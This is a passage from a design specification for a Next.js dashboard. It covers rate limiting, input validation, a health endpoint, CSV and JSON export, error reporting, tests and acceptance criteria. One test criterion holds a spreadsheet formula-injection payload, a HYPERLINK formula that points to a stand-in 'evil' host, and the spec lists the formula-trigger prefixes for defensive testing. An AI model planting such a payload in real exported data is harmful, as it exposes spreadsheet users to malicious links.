  Upstash, a platform primitive) — out of scope here, but the constraint must be stated so nobody
  believes the endpoint is protected
- Entries are evicted on read when their window has passed, and the map is capped at 10,000 keys
  with oldest-window eviction. An unbounded keyed-by-IP map *is itself* the memory-exhaustion bug
  the limiter was added to prevent
- A limited request returns `429` with `Retry-After` in seconds and an empty body

##### S4 — Input handling

- Every API route validates its input before use and rejects unknown fields, following the
  validate → delegate → map-errors flow established by `specs/market-intelligence-spec.md`
- Export filter values are validated against the `ExportOptions` shape: dates must parse as ISO
  8601, `healthScoreMin/Max` must be finite and within 0–100 with `min <= max`, tiers must be
  members of the union, `customerIds` must exist in the dataset. Invalid filters produce an inline
  message, never a request
- Customer-supplied strings reach the DOM only as JSX children, per the card spec. No
  `dangerouslySetInnerHTML` anywhere in orchestrator-owned code
- CSV output is escaped per F8. **JSX escaping does not cover file output** — this is the one place
  where the repo's existing security posture has a real gap, and it is created by adding export

##### S5 — Health check: `GET /api/health`

- Returns `200` with `{ "status": "ok", "timestamp": "<ISO>", "version": "<package version>" }`
- **No dependency detail, no versions of internal libraries, no hostnames, no environment variable
  names, no uptime of internal services.** An unauthenticated health endpoint that enumerates
  internals is a reconnaissance gift. Detailed dependency health belongs behind auth, which this
  repo does not have
- `Cache-Control: no-store`, so a load balancer never reads a cached "ok"
- Liveness only. It reports that the Next process can serve a request. It does not check the mock
  data modules, because they are static imports — if they were broken, the process would not have
  started. A readiness probe that always returns the same value as liveness is noise; add one when
  a real external dependency exists

### Integration Requirements

- `src/app/page.tsx` is reduced to a Server Component rendering `<DashboardOrchestrator />`. The
  `require()` placeholder, the `CustomerCardDemo` try/catch, the `DashboardWidgetDemo` dashed tiles,
  and the "Workshop Progress" panel are all deleted — their job is done by the registry's
  `WidgetUnavailableTile`
- `src/app/layout.tsx` metadata is currently the create-next-app default (`title: "Create Next App"`,
  `description: "Generated by create next app"`). Update to the real product name. Shipping scaffold
  metadata to production reads as unfinished, and the requirements ask for deployment readiness
- `globals.css` sets `body { font-family: Arial, Helvetica, sans-serif }`, which **overrides the
  Geist fonts** loaded in `layout.tsx` and wired into `--font-sans`. Either use
  `font-family: var(--font-sans)` or remove the `next/font` setup; keeping both means paying the
  font download cost for fonts that never render
- Every existing widget spec's error and loading contract stays valid. The orchestrator adds the
  outer boundary and the shared shell; it does not require rewriting
  `MarketIntelligenceWidget`'s internal `idle | loading | success | error` machine
- Widgets receive the card shell from the orchestrator. A widget that renders its own
  `rounded-lg border … shadow-sm` wrapper inside the orchestrator's produces a visible double
  border; when adopting an existing widget, its outer wrapper moves out

## Constraints

### Technical Stack
- Next.js 15.5 App Router with Route Handlers and Middleware
- React 19.1 — class components for error boundaries (no hook alternative exists), function
  components and hooks elsewhere
- TypeScript 5 with `strict: true`; all exported interfaces explicitly typed; no `any`
- Tailwind CSS v4 via `@tailwindcss/postcss`
- Path alias `@/*` → `./src/*` is configured in `tsconfig.json` and must be used for all
  cross-directory imports
- **No new runtime dependencies.** Virtualization, focus trapping, and CSV generation are all
  implemented directly: `<dialog>` covers focus trapping natively, and the CSV writer is under 60
  lines. Vitest and `axe-core` are added as devDependencies only (see Testing)

### File Structure

```
middleware.ts                                  # CSP nonce + response headers (repo root)
next.config.ts                                 # extend: async headers()
src/app/page.tsx                               # rewrite: renders <DashboardOrchestrator />
src/app/layout.tsx                             # edit: real metadata
src/app/api/errors/route.ts
src/app/api/health/route.ts
src/components/DashboardOrchestrator.tsx
src/components/DashboardErrorBoundary.tsx
src/components/WidgetErrorBoundary.tsx
src/components/ErrorBoundary.tsx                # deprecated re-export for MI spec compatibility
src/components/DashboardGrid.tsx
src/components/WidgetSkeleton.tsx
src/components/WidgetUnavailableTile.tsx
src/components/Announcer.tsx
src/components/SkipLink.tsx
src/components/ExportDialog.tsx
src/components/KeyboardShortcutsDialog.tsx
src/lib/dashboard/DashboardContext.tsx
src/lib/dashboard/widgetRegistry.ts
src/lib/dashboard/useKeyboardShortcuts.ts
src/lib/errors/AppError.ts
src/lib/errors/reportError.ts
src/lib/errors/redact.ts
src/lib/export/ExportUtils.ts
src/lib/export/exportRegistry.ts
src/lib/export/csv.ts
src/lib/export/json.ts
src/lib/export/filename.ts
src/lib/env.ts                                  # single isDevelopment export
src/lib/rateLimit.ts
src/data/customer-fixtures.ts                   # deterministic generateCustomers(count)
src/types/dashboard.ts                          # shared WidgetProps / descriptor types
```

### Code Quality
- Named exports only — no default exports for components. The **sole** exception is the `default`
  key each lazy loader must produce, which is an adapter object inside the registry, not a component
  export
- Descriptive identifiers; no abbreviations such as `btn`, `usr`, `cfg`, `ctx`
- JSDoc on: the CSV escaping function (state the injection threat), the eviction logic in
  `rateLimit.ts`, the retry-and-remount logic in `WidgetErrorBoundary`, the redaction allowlist, and
  the chunked export generator
- `'use client'` only where genuinely needed: the orchestrator and its interactive descendants.
  `page.tsx` and `layout.tsx` stay Server Components
- Reusable logic lives in custom hooks (`useKeyboardShortcuts`, `useExport`, `useAnnouncer`), per
  `requirements/code-quality.md`
- Magic numbers — retry cap, chunk size, rate-limit window, announcement gap, virtualization
  threshold, report caps — are named constants defined once and exported where tests need them

### Testing

The repository has no test runner, so most of this spec's behavior is otherwise unverifiable by
anything but manual inspection. `specs/market-intelligence-spec.md` already commits to adding Vitest
as a devDependency with `"test": "vitest run"`; this spec extends that setup rather than introducing
a second one. Also add `axe-core` (with `jsdom` and a testing-library renderer) as devDependencies
for the automated accessibility assertions
`requirements/production-ready-dashboard.md` explicitly requires.

Required unit tests — these cover the logic where a plausible-looking wrong implementation passes
casual review:

- `src/lib/export/csv.test.ts` — formula-injection prefixing for each of `=`, `+`, `-`, `@`, tab,
  CR; RFC 4180 quoting of embedded quotes, commas, and newlines; BOM present; `null`/`undefined` as
  empty; only `provider.columns` emitted, in order
- `src/lib/export/filename.test.ts` — no colon in output; `_filtered` present iff a filter narrows;
  provider id pattern enforced
- `src/lib/export/ExportUtils.test.ts` — abort between chunks stops iteration and produces no file;
  a 5,000-row provider yields the correct row count; progress is indeterminate when `estimateCount`
  is absent
- `src/lib/errors/redact.test.ts` — email, name, company, and domains are stripped; an email-shaped
  string nested in `detail` is stripped; allowlist rather than denylist behavior is demonstrated by
  a payload with an unexpected key
- `src/lib/errors/reportError.test.ts` — the 10-per-session cap, the 60-second duplicate window, and
  8 KB truncation, all driven by an injected clock; a throwing transport does not propagate
- `src/lib/rateLimit.test.ts` — allow up to the limit, `429` past it, window reset via injected
  clock, eviction at the key cap
- `src/data/customer-fixtures.test.ts` — `generateCustomers(200)` is deterministic across calls and
  processes, ids are unique, and every record satisfies the `Customer` type

Required component tests:

- `WidgetErrorBoundary.test.tsx` — a throwing child renders the fallback while a sibling stays
  mounted; retry remounts (a child counting its own mounts proves it); the retry control disappears
  after `maxRetries`; a changed customer id resets the attempt counter
- `DashboardGrid.test.tsx` — a rejecting `load` renders `WidgetUnavailableTile` and calls no
  reporter for a module-not-found reason; skeleton height matches the descriptor
- `Announcer.test.tsx` — two rapid announcements are delivered sequentially, not overwritten; an
  identical consecutive message is dropped
- `DashboardOrchestrator.a11y.test.tsx` — axe reports no violations in the default state and with a
  customer selected; exactly one `h1`; exactly one `main`; the skip link is the first tabbable node

Assert all time-dependent behavior by advancing an injected clock or Vitest fake timers. Never sleep,
and never compare wall-clock durations.

## Acceptance Criteria

Following the convention in `specs/customer-card-spec.md`, each criterion is tagged by how it is
verified. `Automated` items become executable once Vitest is added per Testing; `Manual` items
require a browser, a screen reader, or a Lighthouse run.

### Automated — build and type safety
- [ ] `npm run type-check` passes with no errors
- [ ] `npm run lint` passes with no errors or warnings
- [ ] `npm run build` succeeds and the route list shows `/api/errors` and `/api/health`
- [ ] `npm test` passes

### Automated — error handling
- [ ] A widget that throws during render shows the widget fallback while every sibling widget
      remains mounted and interactive
- [ ] "Try again" remounts the widget subtree rather than re-rendering the same instance
- [ ] The retry control is gone after `maxRetries` consecutive failures, replaced by a permanent
      message; no infinite retry loop and no unbounded error reports
- [ ] Changing the selected customer resets a widget's retry counter to zero
- [ ] A registry entry whose `load` rejects renders `WidgetUnavailableTile` and reports nothing for
      a module-not-found reason
- [ ] `AppError` subclasses are categorized by their `category` field, and categorization still
      works after a production build (no reliance on `constructor.name`)
- [ ] `reportError` never throws and never rejects, including when the transport throws
- [ ] At most 10 reports per session; an identical report inside 60s is dropped; payloads truncate
      at 8 KB

### Automated — export
- [ ] A customer named `=HYPERLINK("http://evil","x")` exports as a text cell prefixed with `'`,
      not as a formula
- [ ] Fields containing quotes, commas, and newlines round-trip through a spec-compliant CSV parser
- [ ] The CSV begins with a UTF-8 BOM and uses `\r\n` line terminators
- [ ] Only columns declared in `provider.columns` appear, in that order, even when a provider yields
      extra keys
- [ ] JSON exports include `metadata.dataSource === "mock"`
- [ ] Cancelling mid-export stops row consumption, writes no file, and leaves no partial download
- [ ] A 5,000-row export completes with the correct row count and never buffers all rows at once
- [ ] Filenames contain no colon; `_filtered` appears exactly when a filter narrows the set
- [ ] `URL.revokeObjectURL` is called for every `createObjectURL`, including on the error path

### Automated — security and API
- [ ] `POST /api/errors` returns `204` with an empty body on success
- [ ] A malformed report returns `400` with a `{ error }` body containing no stack trace and no
      internal path
- [ ] A non-POST method returns `405`; a body over 16 KB returns `413`
- [ ] The 21st request in a minute returns `429` with `Retry-After`
- [ ] `GET /api/health` returns `200` with `status`, `timestamp`, and `version` only — no dependency,
      host, or environment detail
- [ ] Both routes send `Cache-Control: no-store`
- [ ] Redaction strips `name`, `company`, `email`, and `domains`, and strips an email-shaped string
      nested in `detail`
- [ ] Invalid export filters (unparseable date, `min > max`, out-of-range score, unknown tier) are
      rejected client-side with an inline message and no request

### Automated — accessibility
- [ ] axe-core reports no violations in the default state and with a customer selected
- [ ] Exactly one `h1`, exactly one `main`, and no positive `tabIndex` in the rendered dashboard
- [ ] Every widget `<section>` has an accessible name via `aria-labelledby`
- [ ] Two rapid announcements are both delivered; an identical consecutive one is dropped
- [ ] Exactly one `aria-live="polite"` and one `aria-live="assertive"` region exist for the whole
      dashboard

### Manual — browser verification
- [ ] `Tab` from page load lands on the skip link first; activating it moves focus into `<main>`
- [ ] Focus moves to the widget fallback heading when a widget errors, and back into the widget
      after a successful retry — focus never lands on `<body>`
- [ ] The export dialog traps focus, closes on `Esc`, and returns focus to the trigger
- [ ] `/`, `e`, and `?` do nothing while focus is inside a text input, and nothing when a modifier
      key is held
- [ ] The keyboard shortcut list is reachable without knowing the shortcuts
- [ ] Widget skeletons occupy their final height — no visible jump when a lazy widget resolves
- [ ] In Windows High Contrast / `forced-colors: active`, health and sentiment indicators remain
      distinguishable and their text labels remain visible
- [ ] With `prefers-reduced-motion: reduce`, no shimmer, dialog transition, or progress animation
      plays
- [ ] Contrast passes AA in both light and dark schemes, skeletons and focus rings included
- [ ] Layout is intact and usable at 320px, 768px, 1024px, and 1440px
- [ ] With CSP enforced, the app hydrates with **zero** CSP violations in the console; removing the
      nonce visibly breaks hydration (confirming the policy is actually enforced)
- [ ] Response headers include all of S1's headers plus `Content-Security-Policy`
- [ ] `next build` output shows widget code in separate chunks, and the export writers absent from
      the initial JS
- [ ] Lighthouse on a production build meets FCP < 1.5s, LCP < 2.5s, CLS < 0.1, TTI < 3.5s on a
      broadband profile — recorded as a measurement, not enforced by any check in the repo
- [ ] Interactions stay at 60fps during a 5,000-row export (verified in the Performance panel)
- [ ] No detached-node or listener growth after 20 customer-selection cycles (verified with heap
      snapshots)
- [ ] Development fallbacks show stack and component stack; a production build shows neither, and
      no `console` call contains customer names or emails

### Manual — screen reader verification
- [ ] Customer selection is announced once, not once per widget
- [ ] Export start, progress, completion, and cancellation are each announced
- [ ] A widget error is announced via its `role="alert"` fallback
- [ ] Verified against at least two of NVDA, JAWS, and VoiceOver

## Deferred With Rationale

Requirements from `requirements/production-ready-dashboard.md` that are **not** delivered by this
spec, with what would have to exist first. Nothing here is dropped quietly; each is a scoping
decision the reader can overturn.

| Requirement | Why deferred | Precondition |
|---|---|---|
| Authentication, authorization, session management, secure cookies | The repo has no auth system, no user model, and no server-side session. `mockCustomers` is a static import with no access control | An identity provider and a session layer |
| CSRF protection | No cookie-authenticated state-changing endpoint exists. `POST /api/errors` is unauthenticated and has no persistent side effect, so a CSRF token would be theater | Cookie-based auth |
| "Export audit logging and user permission validation" | An audit log with no authenticated identity records only an in-memory `sessionId` — useful for debugging, worthless for the compliance purpose the requirement names. Implemented at that honest level, and labelled as such | Auth |
| Service worker and offline capability | A SW that caches `/api/*` directly contradicts the `Cache-Control: no-store` that `specs/market-intelligence-spec.md` requires, and would serve stale market data while claiming freshness. For an all-mock dataset the offline benefit is near zero against a real risk of a poisoned cache with no kill switch | A real data layer, a cache-invalidation strategy, and an unregister path |
| CDN configuration, connection pooling, backup and recovery | Deployment-platform and database concerns; there is no database and no chosen host | A deployment target |
| External error-tracking integration (Sentry et al.) | Would add a runtime dependency and an outbound trust boundary. `POST /api/errors` plus structured server logs is the vendor-neutral seam a vendor would later plug into | A chosen vendor and a DSN in secret management |
| Core Web Vitals **enforcement**, "custom monitoring dashboard", user-interaction analytics | Targets are stated and measurable manually, but there is no CI, no RUM endpoint, and no analytics backend, so no check in this repo can fail on a regression. Analytics would also raise consent questions the workshop does not address | CI with Lighthouse budgets; a metrics sink |
| Image optimization and asset compression | The dashboard renders no images beyond `favicon.ico`, and Next already compresses responses by default. Nothing to optimize | Images |
| Performance alerting, error-rate thresholds, dependency health monitoring | Alerting lives in the monitoring system, not the app. `/api/health` is the integration point that makes it possible | An uptime/APM service |
| Source maps in production | A one-line `next.config.ts` toggle, but it exposes source to anyone with devtools. The right call depends on whether the deployment is public, which is unknown | A decision on deployment audience |

## Out of Scope

- Any widget's internal rendering, data fetching, or business logic — owned by that widget's spec
- Health score computation (`requirements/health-score-calculator.md`), alert generation
  (`requirements/predictive-alerts.md`), sentiment analysis (`specs/market-intelligence-spec.md`)
- Search, filtering, and selection UI — owned by `CustomerSelector`; the orchestrator holds only the
  selected id
- Replacing mock data with real APIs
- Persisting selection to URL, `localStorage`, or a server. `requirements/customer-selector.md` asks
  to "persist selection across page interactions", which the in-memory orchestrator state already
  satisfies within a session; cross-reload persistence is a separate decision with its own
  storage-consent implications
- Theming beyond the `prefers-color-scheme` support already in `globals.css`
- Internationalization and localization
